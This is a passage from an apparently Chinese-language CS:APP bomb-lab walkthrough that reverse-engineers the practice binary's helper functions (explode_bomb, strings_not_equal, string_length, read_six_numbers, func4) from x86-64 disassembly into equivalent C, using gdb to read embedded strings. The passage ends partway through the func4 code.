<h2 id="explode-bomb"><a href="#explode-bomb" class="headerlink" title="explode_bomb"></a>explode_bomb</h2><p><code>explode_bomb</code>函数对应的汇编语句如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">000000000040143a &lt;explode_bomb&gt;:</span><br><span class="line">  40143a:	48 83 ec 08          	sub    $0x8,%rsp</span><br><span class="line">  40143e:	bf a3 25 40 00       	mov    $0x4025a3,%edi</span><br><span class="line">  401443:	e8 c8 f6 ff ff       	callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">  401448:	bf ac 25 40 00       	mov    $0x4025ac,%edi</span><br><span class="line">  40144d:	e8 be f6 ff ff       	callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">  401452:	bf 08 00 00 00       	mov    $0x8,%edi</span><br><span class="line">  401457:	e8 c4 f7 ff ff       	callq  400c20 &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure>
<p><code>gdb</code>查看<code>0x4025a3</code>和<code>0x4025ac</code>指向的值：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">(gdb) x/s 0x4025a3</span><br><span class="line">(gdb) x/s 0x4025ac</span><br></pre></td></tr></table></figure>
<p>可以得到输出如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">0x4025a3:       &quot;\nBOOM!!!&quot;</span><br><span class="line">0x4025ac:       &quot;The bomb has blown up.&quot;</span><br></pre></td></tr></table></figure>
<p>可以看出<code>explode_bomb</code>函数的功能就是<strong>引爆炸弹</strong>。</p>
<h2 id="strings-not-equal"><a href="#strings-not-equal" class="headerlink" title="strings_not_equal"></a>strings_not_equal</h2><p><span id = "equal"><code>strings_not_equal</code>函数</span>对应的汇编语句如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0000000000401338 &lt;strings_not_equal&gt;:</span><br><span class="line">  401338:	41 54                	push   %r12</span><br><span class="line">  40133a:	55                   	push   %rbp</span><br><span class="line">  40133b:	53                   	push   %rbx</span><br><span class="line">  40133c:	48 89 fb             	mov    %rdi,%rbx</span><br><span class="line">  40133f:	48 89 f5             	mov    %rsi,%rbp</span><br><span class="line">  401342:	e8 d4 ff ff ff       	callq  40131b &lt;string_length&gt;</span><br><span class="line">  401347:	41 89 c4             	mov    %eax,%r12d</span><br><span class="line">  40134a:	48 89 ef             	mov    %rbp,%rdi</span><br><span class="line">  40134d:	e8 c9 ff ff ff       	callq  40131b &lt;string_length&gt;</span><br><span class="line">  401352:	ba 01 00 00 00       	mov    $0x1,%edx</span><br><span class="line">  401357:	41 39 c4             	cmp    %eax,%r12d</span><br><span class="line">  40135a:	75 3f                	jne    40139b &lt;strings_not_equal+0x63&gt;</span><br><span class="line">  40135c:	0f b6 03             	movzbl (%rbx),%eax</span><br><span class="line">  40135f:	84 c0                	test   %al,%al</span><br><span class="line">  401361:	74 25                	je     401388 &lt;strings_not_equal+0x50&gt;</span><br><span class="line">  401363:	3a 45 00             	cmp    0x0(%rbp),%al</span><br><span class="line">  401366:	74 0a                	je     401372 &lt;strings_not_equal+0x3a&gt;</span><br><span class="line">  401368:	eb 25                	jmp    40138f &lt;strings_not_equal+0x57&gt;</span><br><span class="line">  40136a:	3a 45 00             	cmp    0x0(%rbp),%al</span><br><span class="line">  40136d:	0f 1f 00             	nopl   (%rax)</span><br><span class="line">  401370:	75 24                	jne    401396 &lt;strings_not_equal+0x5e&gt;</span><br><span class="line">  401372:	48 83 c3 01          	add    $0x1,%rbx</span><br><span class="line">  401376:	48 83 c5 01          	add    $0x1,%rbp</span><br><span class="line">  40137a:	0f b6 03             	movzbl (%rbx),%eax</span><br><span class="line">  40137d:	84 c0                	test   %al,%al</span><br><span class="line">  40137f:	75 e9                	jne    40136a &lt;strings_not_equal+0x32&gt;</span><br><span class="line">  401381:	ba 00 00 00 00       	mov    $0x0,%edx</span><br><span class="line">  401386:	eb 13                	jmp    40139b &lt;strings_not_equal+0x63&gt;</span><br><span class="line">  401388:	ba 00 00 00 00       	mov    $0x0,%edx</span><br><span class="line">  40138d:	eb 0c                	jmp    40139b &lt;strings_not_equal+0x63&gt;</span><br><span class="line">  40138f:	ba 01 00 00 00       	mov    $0x1,%edx</span><br><span class="line">  401394:	eb 05                	jmp    40139b &lt;strings_not_equal+0x63&gt;</span><br><span class="line">  401396:	ba 01 00 00 00       	mov    $0x1,%edx</span><br><span class="line">  40139b:	89 d0                	mov    %edx,%eax</span><br><span class="line">  40139d:	5b                   	pop    %rbx</span><br><span class="line">  40139e:	5d                   	pop    %rbp</span><br><span class="line">  40139f:	41 5c                	pop    %r12</span><br><span class="line">  4013a1:	c3                   	retq</span><br></pre></td></tr></table></figure>
<p>分段分析：</p>
<hr>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">401338:	41 54                	push   %r12</span><br><span class="line">40133a:	55                   	push   %rbp</span><br><span class="line">40133b:	53                   	push   %rbx</span><br><span class="line">40133c:	48 89 fb             	mov    %rdi,%rbx</span><br><span class="line">40133f:	48 89 f5             	mov    %rsi,%rbp</span><br></pre></td></tr></table></figure>
<p>40133c和40133f将<code>%rdi</code>和<code>%rsi</code>寄存器的值分别给了<code>%rbx</code>和<code>%rbp</code>（注意<code>%rdi</code>存的是<code>input</code>字符串；<code>%rsi</code>存的是疑似密码的字符串）</p>
<hr>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">401342:	e8 d4 ff ff ff       	callq  40131b &lt;string_length&gt;</span><br></pre></td></tr></table></figure>
<p>401342调用<code>string_length</code>函数，推测可能返回某字符串的长度，<span id = "backToEqual"><a href="#length">点此分析<code>string_length</code>函数</a></span></p>
<hr>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">401347:	41 89 c4             	mov    %eax,%r12d</span><br></pre></td></tr></table></figure>
<p>401347将<code>%eax</code>的值（即<code>string_length</code>函数返回值，<code>input</code>字符串的长度）给<code>%r12d</code></p>
<hr>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">40134a:	48 89 ef             	mov    %rbp,%rdi</span><br></pre></td></tr></table></figure>
<p>40134a将<code>%rbp</code>的值（疑似密码的字符串）给了<code>%rdi</code></p>
<hr>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">40134d:	e8 c9 ff ff ff       	callq  40131b &lt;string_length&gt;</span><br></pre></td></tr></table></figure>
<p>40134d再次调用<code>string_length</code>函数，由于<code>%rdi</code>在上一步被重新赋值为疑似密码的字符串，此处求的就是密码串的长度，存储在<code>%eax</code>中</p>
<hr>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">401352:	ba 01 00 00 00       	mov    $0x1,%edx</span><br></pre></td></tr></table></figure>
<p>401352将<code>%edx</code>的值赋为1</p>
<hr>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">401357:	41 39 c4             	cmp    %eax,%r12d</span><br><span class="line">40135a:	75 3f                	jne    40139b &lt;strings_not_equal+0x63&gt;</span><br><span class="line">...</span><br><span class="line">40139b:	89 d0                	mov    %edx,%eax</span><br></pre></td></tr></table></figure>
<p>401357和40135a比较<code>%eax</code>和<code>%r12d</code>处的值，即密码串和输入串的长度：</p>
<ul>
<li>若二者不相等则跳到40139b（401338+0x63）将<code>%eax</code>的值赋为1（见401352）（可以看出**密码串和输入串的长度不相等时函数返回<code>1</code>**）；</li>
<li>若二者相等则继续执行</li>
</ul>
<hr>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">40135c:	0f b6 03             	movzbl (%rbx),%eax</span><br></pre></td></tr></table></figure>
<p>40135c将<code>%rbx</code>指向的内容（<code>input</code>字符串第1个字符）传给<code>%eax</code>寄存器（零扩展，见CS:APP中文第三版123页）</p>
<hr>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">40135f:	84 c0                	test   %al,%al</span><br><span class="line">401361:	74 25                	je     401388 &lt;strings_not_equal+0x50&gt;</span><br><span class="line">...</span><br><span class="line">401388:	ba 00 00 00 00       	mov    $0x0,%edx</span><br><span class="line">40138d:	eb 0c                	jmp    40139b &lt;strings_not_equal+0x63&gt;</span><br><span class="line">...</span><br><span class="line">40139b:	89 d0                	mov    %edx,%eax</span><br></pre></td></tr></table></figure>
<p>40135f和401361判断<code>%al</code>寄存器的值（<code>input</code>字符串第1个字符）是否为<code>&#39;\0&#39;</code>：</p>
<ul>
<li>若为<code>&#39;\0&#39;</code>则跳到401388（401338+0x50）将<code>%edx</code>赋为0（继续执行40138d和40139b（401338+0x63）将<code>%edx</code>的0给<code>%eax</code>并<strong>返回</strong>）；</li>
<li>若不为<code>&#39;\0&#39;</code>则继续执行</li>
</ul>
<hr>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">401363:	3a 45 00             	cmp    0x0(%rbp),%al</span><br><span class="line">401366:	74 0a                	je     401372 &lt;strings_not_equal+0x3a&gt;</span><br><span class="line">401368:	eb 25                	jmp    40138f &lt;strings_not_equal+0x57&gt;</span><br><span class="line">...</span><br><span class="line">401372:	48 83 c3 01          	add    $0x1,%rbx</span><br><span class="line">...</span><br><span class="line">40138f:	ba 01 00 00 00       	mov    $0x1,%edx</span><br><span class="line">401394:	eb 05                	jmp    40139b &lt;strings_not_equal+0x63&gt;</span><br><span class="line">...</span><br><span class="line">40139b:	89 d0                	mov    %edx,%eax</span><br></pre></td></tr></table></figure>
<p>401363、401366和401368比较<code>%rbp</code>指向的值（密码串第1个字符）和<code>%al</code>（输入串第1个字符）：</p>
<ul>
<li>若二者相等则跳到401372（401338+0x3a）；</li>
<li>若不等则继续执行跳到40138f（401338+0x57）将<code>%edx</code>赋为1（继续执行401394和40139b（401338+0x63）将<code>%edx</code>的1给<code>%eax</code>并<strong>返回</strong>）</li>
</ul>
<hr>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">40136a:	3a 45 00             	cmp    0x0(%rbp),%al</span><br><span class="line">40136d:	0f 1f 00             	nopl   (%rax)</span><br><span class="line">401370:	75 24                	jne    401396 &lt;strings_not_equal+0x5e&gt;</span><br><span class="line">401372:	48 83 c3 01          	add    $0x1,%rbx</span><br><span class="line">401376:	48 83 c5 01          	add    $0x1,%rbp</span><br><span class="line">40137a:	0f b6 03             	movzbl (%rbx),%eax</span><br><span class="line">40137d:	84 c0                	test   %al,%al</span><br><span class="line">40137f:	75 e9                	jne    40136a &lt;strings_not_equal+0x32&gt;</span><br><span class="line">401381:	ba 00 00 00 00       	mov    $0x0,%edx</span><br><span class="line">401386:	eb 13                	jmp    40139b &lt;strings_not_equal+0x63&gt;</span><br><span class="line">...</span><br><span class="line">401396:	ba 01 00 00 00       	mov    $0x1,%edx</span><br><span class="line">40139b:	89 d0                	mov    %edx,%eax</span><br></pre></td></tr></table></figure>
<p>40136a和401370比较<code>%rbp</code>指向的值（密码串第1个字符）和<code>%al</code>（输入串第1个字符）：</p>
<ul>
<li>若二者不等则跳到401396（401338+0x5e）把1给<code>%edx</code>再给<code>%eax</code>（即<strong>返回1</strong>）；</li>
<li>若相等则继续执行401372将<code>%rbx</code>（输入串指针，见40133c）加1、401376将<code>%rbp</code>（密码串指针）加1。40137a将<code>%rbx</code>指向的内容（<code>input</code>字符串第2个字符）传给<code>%eax</code>寄存器，40137d和40137f判断<code>%al</code>的值是否为<code>&#39;\0&#39;</code>：<ul>
<li>若不为<code>&#39;\0&#39;</code>则跳到40136a（401338+0x32）循环；</li>
<li>若为<code>&#39;\0&#39;</code>则继续执行401381和401386将<code>%edx</code>赋为0并跳到40139b把<code>%edx</code>的0再给<code>%eax</code>并返回（即<strong>返回0</strong>）</li>
</ul>
</li>
</ul>
<p>可以看出此部分的循环等价于：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">	<span class="keyword">if</span> (*p_passwd != locChar)<span class="comment">// %rbp != %al</span></span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;<span class="comment">// %eax</span></span><br><span class="line">	p_input++;<span class="comment">// %rbx</span></span><br><span class="line">	p_passwd++;<span class="comment">// %rbp</span></span><br><span class="line">	locChar = *p_input;<span class="comment">// %rbx-&gt;%eax</span></span><br><span class="line">&#125; <span class="keyword">while</span> (locChar != <span class="string">&#x27;\0&#x27;</span>);<span class="comment">// %al</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;<span class="comment">// %eax</span></span><br></pre></td></tr></table></figure>
<p>可以看出此部分用于判断输入串和密码串是否相等，相等则返回0；不等则返回1。</p>
<hr>
<p>综合以上分析可以看出<code>strings_not_equal</code>函数的功能就是**比较<code>%rdi</code>和<code>%rsi</code>指向的字符串（即输入串和密码串），相等返回0、不等返回1，返回值存入<code>%eax</code>**。</p>
<p><a href="#p1">点此返回到<code>phase_1</code>调用此函数处</a>。</p>
<h2 id="string-length"><a href="#string-length" class="headerlink" title="string_length"></a>string_length</h2><p><span id = "length"><code>string_length</code>函数</span>对应的汇编语句如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">000000000040131b &lt;string_length&gt;:</span><br><span class="line">  40131b:	80 3f 00             	cmpb   $0x0,(%rdi)</span><br><span class="line">  40131e:	74 12                	je     401332 &lt;string_length+0x17&gt;</span><br><span class="line">  401320:	48 89 fa             	mov    %rdi,%rdx</span><br><span class="line">  401323:	48 83 c2 01          	add    $0x1,%rdx</span><br><span class="line">  401327:	89 d0                	mov    %edx,%eax</span><br><span class="line">  401329:	29 f8                	sub    %edi,%eax</span><br><span class="line">  40132b:	80 3a 00             	cmpb   $0x0,(%rdx)</span><br><span class="line">  40132e:	75 f3                	jne    401323 &lt;string_length+0x8&gt;</span><br><span class="line">  401330:	f3 c3                	repz retq </span><br><span class="line">  401332:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  401337:	c3                   	retq   </span><br></pre></td></tr></table></figure>
<p>分段分析：</p>
<hr>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">40131b:	80 3f 00             	cmpb   $0x0,(%rdi)</span><br><span class="line">40131e:	74 12                	je     401332 &lt;string_length+0x17&gt;</span><br><span class="line">...</span><br><span class="line">401332:	b8 00 00 00 00       	mov    $0x0,%eax</span><br></pre></td></tr></table></figure>
<p>40131b和40131e判断<code>%rdi</code>寄存器指向的值（记住<code>%rdi</code>指向的是<code>input</code>）是否为<code>&#39;\0&#39;</code>：</p>
<ul>
<li>若为<code>&#39;\0&#39;</code>则跳到401332（40131b+0x17）将<code>%eax</code>寄存器的值赋为<code>0</code>后返回（可以看出**输入串为空串时函数返回<code>0</code>**）</li>
<li>若不为<code>&#39;\0&#39;</code>则继续执行</li>
</ul>
<hr>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">401320:	48 89 fa             	mov    %rdi,%rdx</span><br><span class="line">401323:	48 83 c2 01          	add    $0x1,%rdx</span><br><span class="line">401327:	89 d0                	mov    %edx,%eax</span><br><span class="line">401329:	29 f8                	sub    %edi,%eax</span><br><span class="line">40132b:	80 3a 00             	cmpb   $0x0,(%rdx)</span><br><span class="line">40132e:	75 f3                	jne    401323 &lt;string_length+0x8&gt;</span><br><span class="line">401330:	f3 c3                	repz retq </span><br></pre></td></tr></table></figure>
<p>401320先将<code>%rdi</code>寄存器的值给<code>%rdx</code>（记住<code>%rdi</code>指向的是<code>input</code>），401323再将<code>%rdx</code>的值加1，401327再把<code>%edx</code>的值给<code>%eax</code>，401329<code>%eax</code>再减去<code>%edi</code>的值，40132b和40132e判断此时<code>%rdx</code>指向的值是否为<code>&#39;\0&#39;</code>：</p>
<ul>
<li>若不为<code>&#39;\0&#39;</code>则跳到401323（40131b+0x8）循环；</li>
<li>若为<code>&#39;\0&#39;</code>则返回，此时<code>%eax</code>存储的便是<code>%rdi</code>中字符串的长度</li>
</ul>
<p>可以看出此部分的循环等价于：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">p = head;<span class="comment">// %edi-&gt;%rdx</span></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">	p++;<span class="comment">// %rdx</span></span><br><span class="line">	result = p;<span class="comment">// %rdx-&gt;eax</span></span><br><span class="line">	result -= head;<span class="comment">// %eax - %edi</span></span><br><span class="line">&#125; <span class="keyword">while</span> (*p != <span class="string">&#x27;\0&#x27;</span>);<span class="comment">// %rdx</span></span><br><span class="line"><span class="keyword">return</span> result;<span class="comment">// %eax</span></span><br></pre></td></tr></table></figure>
<p><code>p</code>指针从字符串头<code>head</code>开始向后移动，一直移动到末尾<code>&#39;\0&#39;</code>处，此时<code>p</code>与<code>head</code>之差即字符串的长度</p>
<hr>
<p>综合以上分析可以看出<code>string_length</code>函数的功能就是**返回<code>%rdi</code>处字符串的长度，并存入<code>%eax</code>**。</p>
<p><a href="#backToEqual">点此返回到未分析完的<code>strings_not_equal</code>函数</a>。</p>
<h2 id="read-six-numbers"><a href="#read-six-numbers" class="headerlink" title="read_six_numbers"></a>read_six_numbers</h2><p><span id = "6numbers"><code>read_six_numbers</code>函数</span>对应的汇编语句如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">000000000040145c &lt;read_six_numbers&gt;:</span><br><span class="line">  40145c:	48 83 ec 18          	sub    $0x18,%rsp</span><br><span class="line">  401460:	48 89 f2             	mov    %rsi,%rdx</span><br><span class="line">  401463:	48 8d 4e 04          	lea    0x4(%rsi),%rcx</span><br><span class="line">  401467:	48 8d 46 14          	lea    0x14(%rsi),%rax</span><br><span class="line">  40146b:	48 89 44 24 08       	mov    %rax,0x8(%rsp)</span><br><span class="line">  401470:	48 8d 46 10          	lea    0x10(%rsi),%rax</span><br><span class="line">  401474:	48 89 04 24          	mov    %rax,(%rsp)</span><br><span class="line">  401478:	4c 8d 4e 0c          	lea    0xc(%rsi),%r9</span><br><span class="line">  40147c:	4c 8d 46 08          	lea    0x8(%rsi),%r8</span><br><span class="line">  401480:	be c3 25 40 00       	mov    $0x4025c3,%esi</span><br><span class="line">  401485:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  40148a:	e8 61 f7 ff ff       	callq  400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">  40148f:	83 f8 05             	cmp    $0x5,%eax</span><br><span class="line">  401492:	7f 05                	jg     401499 &lt;read_six_numbers+0x3d&gt;</span><br><span class="line">  401494:	e8 a1 ff ff ff       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  401499:	48 83 c4 18          	add    $0x18,%rsp</span><br><span class="line">  40149d:	c3                   	retq </span><br></pre></td></tr></table></figure>
<p>分段分析：</p>
<hr>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">40145c:	48 83 ec 18          	sub    $0x18,%rsp</span><br><span class="line">401460:	48 89 f2             	mov    %rsi,%rdx</span><br><span class="line">401463:	48 8d 4e 04          	lea    0x4(%rsi),%rcx</span><br><span class="line">401467:	48 8d 46 14          	lea    0x14(%rsi),%rax</span><br><span class="line">40146b:	48 89 44 24 08       	mov    %rax,0x8(%rsp)</span><br><span class="line">401470:	48 8d 46 10          	lea    0x10(%rsi),%rax</span><br><span class="line">401474:	48 89 04 24          	mov    %rax,(%rsp)</span><br><span class="line">401478:	4c 8d 4e 0c          	lea    0xc(%rsi),%r9</span><br><span class="line">40147c:	4c 8d 46 08          	lea    0x8(%rsi),%r8</span><br></pre></td></tr></table></figure>
<p>40145c在<code>%rsp</code>中分配24字节空间压栈，401460把<code>%rsi</code>的地址给<code>%rdx</code>，401463把<code>%rsi+4</code>的地址给<code>%rcx</code>，401467把<code>%rsi+20</code>的地址给<code>%rax</code>，40146b把<code>%rax</code>的地址给<code>%rsp+8</code>，401470把<code>%rsi+16</code>的地址给<code>%rax</code>，401474把<code>%rax</code>的地址给<code>%rsp+0</code>，401478把<code>%rsi+12</code>的地址给<code>%r9</code>，40147c把<code>%rsi+8</code>的地址给<code>%r8</code>。</p>
<p>这一连串的赋值可以写成：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%rdx &#x3D; %rsi</span><br><span class="line">%rcx &#x3D; %rsi + 4</span><br><span class="line">0(%rsp) &#x3D; %rsi + 16</span><br><span class="line">8(%rsp) &#x3D; %rsi + 20</span><br><span class="line">%r9 &#x3D; %rsi + 12</span><br><span class="line">%r8 &#x3D; %rsi + 8</span><br></pre></td></tr></table></figure>
<p>按顺序排好：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%rdx &#x3D; %rsi</span><br><span class="line">%rcx &#x3D; %rsi + 4</span><br><span class="line">%r8 &#x3D; %rsi + 8</span><br><span class="line">%r9 &#x3D; %rsi + 12</span><br><span class="line">0x0(%rsp) &#x3D; %rsi + 16</span><br><span class="line">0x8(%rsp) &#x3D; %rsi + 20</span><br></pre></td></tr></table></figure>
<p>由前面的分析可知，<code>%rsi</code>寄存器存放的是<code>%rsp</code>的内容，可知此6个地址对应了<code>%rsp</code>栈中6个<code>int</code>的地址</p>
<hr>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">401480:	be c3 25 40 00       	mov    $0x4025c3,%esi</span><br><span class="line">401485:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">40148a:	e8 61 f7 ff ff       	callq  400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br></pre></td></tr></table></figure>
<p>401480将地址<code>0x4025c3</code>传入<code>%esi</code>寄存器，直接<code>gdb</code>查看此处内容：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">(gdb) x/s 0x4025c3</span><br></pre></td></tr></table></figure>
<p>得到输出如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">0x4025c3:       &quot;%d %d %d %d %d %d&quot;</span><br></pre></td></tr></table></figure>
<p>可以看出这就是C格式化字符串，之后的401485将<code>%eax</code>赋为0，40148a调用<code>sscanf</code>函数（<a href="https://www.ibm.com/support/knowledgecenter/en/ssw_ibm_i_72/rtref/sscanf.htm">什么是<code>sscanf</code>函数？</a>），<strong>推测</strong>此处读取了6个整数并对应存放在上述6个地址中。另外从此格式化字符串可以<strong>推测</strong>，输入6个整数时中间须以1个空格隔开</p>
<hr>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">40148f:	83 f8 05             	cmp    $0x5,%eax</span><br><span class="line">401492:	7f 05                	jg     401499 &lt;read_six_numbers+0x3d&gt;</span><br><span class="line">401494:	e8 a1 ff ff ff       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">401499:	48 83 c4 18          	add    $0x18,%rsp</span><br><span class="line">40149d:	c3                   	retq   </span><br></pre></td></tr></table></figure>
<p>40148f和401492判断<code>%eax</code>的值是否大于5：</p>
<ul>
<li>若大于5则跳到401499（40145c+0x3d）弹出栈并返回；</li>
<li>若不大于5则继续执行401494使炸弹爆炸</li>
</ul>
<hr>
<p>综合以上分析可以看出<code>read_six_numbers</code>函数的功能就是<strong>判断是否输入了5个以上整数，若输入整数未超过5个则引爆炸弹</strong>。</p>
<p><a href="#p2">点此返回到<code>phase_2</code>调用此函数处</a>。</p>
<h2 id="func4"><a href="#func4" class="headerlink" title="func4"></a>func4</h2><p><span id = "func4"><code>func4</code>函数</span>对应的汇编语句如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0000000000400fce &lt;func4&gt;:</span><br><span class="line">  400fce:	48 83 ec 08          	sub    $0x8,%rsp</span><br><span class="line">  400fd2:	89 d0                	mov    %edx,%eax</span><br><span class="line">  400fd4:	29 f0                	sub    %esi,%eax</span><br><span class="line">  400fd6:	89 c1                	mov    %eax,%ecx</span><br><span class="line">  400fd8:	c1 e9 1f             	shr    $0x1f,%ecx</span><br><span class="line">  400fdb:	01 c8                	add    %ecx,%eax</span><br><span class="line">  400fdd:	d1 f8                	sar    %eax</span><br><span class="line">  400fdf:	8d 0c 30             	lea    (%rax,%rsi,1),%ecx</span><br><span class="line">  400fe2:	39 f9                	cmp    %edi,%ecx</span><br><span class="line">  400fe4:	7e 0c                	jle    400ff2 &lt;func4+0x24&gt;</span><br><span class="line">  400fe6:	8d 51 ff             	lea    -0x1(%rcx),%edx</span><br><span class="line">  400fe9:	e8 e0 ff ff ff       	callq  400fce &lt;func4&gt;</span><br><span class="line">  400fee:	01 c0                	add    %eax,%eax</span><br><span class="line">  400ff0:	eb 15                	jmp    401007 &lt;func4+0x39&gt;</span><br><span class="line">  400ff2:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  400ff7:	39 f9                	cmp    %edi,%ecx</span><br><span class="line">  400ff9:	7d 0c                	jge    401007 &lt;func4+0x39&gt;</span><br><span class="line">  400ffb:	8d 71 01             	lea    0x1(%rcx),%esi</span><br><span class="line">  400ffe:	e8 cb ff ff ff       	callq  400fce &lt;func4&gt;</span><br><span class="line">  401003:	8d 44 00 01          	lea    0x1(%rax,%rax,1),%eax</span><br><span class="line">  401007:	48 83 c4 08          	add    $0x8,%rsp</span><br><span class="line">  40100b:	c3                   	retq   </span><br></pre></td></tr></table></figure>
<p>分段分析：</p>
<hr>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">400fce:	48 83 ec 08          	sub    $0x8,%rsp</span><br><span class="line">400fd2:	89 d0                	mov    %edx,%eax</span><br><span class="line">400fd4:	29 f0                	sub    %esi,%eax</span><br><span class="line">400fd6:	89 c1                	mov    %eax,%ecx</span><br><span class="line">400fd8:	c1 e9 1f             	shr    $0x1f,%ecx</span><br><span class="line">400fdb:	01 c8                	add    %ecx,%eax</span><br><span class="line">400fdd:	d1 f8                	sar    %eax</span><br></pre></td></tr></table></figure>
<p>400fce分配8字节空间压栈，400fd2将<code>%edx</code>的值（14）赋给<code>%eax</code>，400fd4将<code>%eax</code>减去<code>%esi</code>（0），400fd6将<code>%eax</code>的值（差值）赋给<code>%ecx</code>，400fd8再将<code>%ecx</code>（差值）逻辑右移31位，400fdb再将<code>%eax</code>的值（差值）加上<code>%ecx</code>（右移后的值），400fdd将二者之和算术右移1位，结果存入<code>%eax</code></p>
<hr>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">400fdf:	8d 0c 30             	lea    (%rax,%rsi,1),%ecx</span><br><span class="line">400fe2:	39 f9                	cmp    %edi,%ecx</span><br><span class="line">400fe4:	7e 0c                	jle    400ff2 &lt;func4+0x24&gt;</span><br><span class="line">400fe6:	8d 51 ff             	lea    -0x1(%rcx),%edx</span><br><span class="line">400fe9:	e8 e0 ff ff ff       	callq  400fce &lt;func4&gt;</span><br><span class="line">400fee:	01 c0                	add    %eax,%eax</span><br><span class="line">400ff0:	eb 15                	jmp    401007 &lt;func4+0x39&gt;</span><br><span class="line">400ff2:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">400ff7:	39 f9                	cmp    %edi,%ecx</span><br><span class="line">400ff9:	7d 0c                	jge    401007 &lt;func4+0x39&gt;</span><br><span class="line">400ffb:	8d 71 01             	lea    0x1(%rcx),%esi</span><br><span class="line">400ffe:	e8 cb ff ff ff       	callq  400fce &lt;func4&gt;</span><br><span class="line">401003:	8d 44 00 01          	lea    0x1(%rax,%rax,1),%eax</span><br><span class="line">401007:	48 83 c4 08          	add    $0x8,%rsp</span><br><span class="line">40100b:	c3                   	retq   </span><br></pre></td></tr></table></figure>
<p>400fdf将<code>%rax</code>的值（右移1位后的值）和<code>%rsi</code>的值（0）加到<code>%ecx</code>中，400fe2和400fe4将<code>%ecx</code>（二者之和）和<code>%edi</code>（输入的第一个整数）对比：</p>
<ul>
<li>若二者之和不超过输入的第1个整数，则跳到400ff2（400fce+0x24）将<code>%eax</code>（先前存放右移1位后的值）赋为0，400ff7和400ff9比较<code>%edi</code>（输入的第1个整数）和<code>%ecx</code>（二者之和）：<ul>
<li>若二者之和不小于输入的第1个整数（即二者之和等于输入的第1个整数），则跳到401007（400fce+0x39）弹出栈并返回（<strong>此时返回值<code>%eax</code>为0</strong>）</li>
<li>若二者之和小于输入的第1个整数，则继续执行400ffb将<code>%rcx</code>（二者之和）加1赋给<code>%esi</code>（先前存放的是0），400ffe递归调用<code>func4</code>函数，401003将递归调用的返回值<code>%rax</code>乘2再加1，401007<strong>返回</strong></li>
</ul>
</li>
<li>若二者之和超过了输入的第1个整数，则继续执行400fe6将<code>%rcx</code>（二者之和）减1赋给<code>%edx</code>（先前存放的是14），400fe9递归调用<code>func4</code>函数，400fee将递归调用的返回值<code>%eax</code>乘2，400ff0跳到401007（400fce+0x39）弹出栈并<strong>返回</strong></li>
</ul>
<p>结合两部分的分析，可以看出此部分的递归调用等价于：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">func4</span><span class="params">(<span class="keyword">int</span> passwd, <span class="keyword">int</span> min, <span class="keyword">int</span> max)</span> </span>&#123;<span class="comment">// %edi, %esi, %edx-&gt;%eax</span></span><br><span class="line">	<span class="keyword">int</span> len = max - min;<span class="comment">// %ecx</span></span><br><span class="line">  <span class="keyword">unsigned</span> sign = len &gt;&gt; <span class="number">31</span>;<span class="comment">// %ecx</span></span><br><span class="line">  <span class="keyword">int</span> half_len = (len + sign) &gt;&gt; <span class="number">1</span>;<span class="comment">// %eax</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">int</span> mid = half_len + min;<span class="comment">// %ecx</span></span><br><span class="line">  <span class="keyword">if</span> (mid &lt;= passwd) &#123;</span><br><span class="line">    half_len = <span class="number">0</span>;<span class="comment">// %eax</span></span><br><span class="line">    <span class="keyword">if</span> (mid &gt;= passwd)<span class="comment">// mid == passwd</span></span><br><span class="line">      <span class="keyword">return</span> half_len;</span><br><span class="line">    <span class="keyword">else</span> &#123;<span class="comment">// mid &lt; passwd</span></span><br><span class="line">      min = mid + <span class="number">1</span>;</span><br><span class="line">      half_len = func4(passwd, min, max) * <span class="number">2</span> + 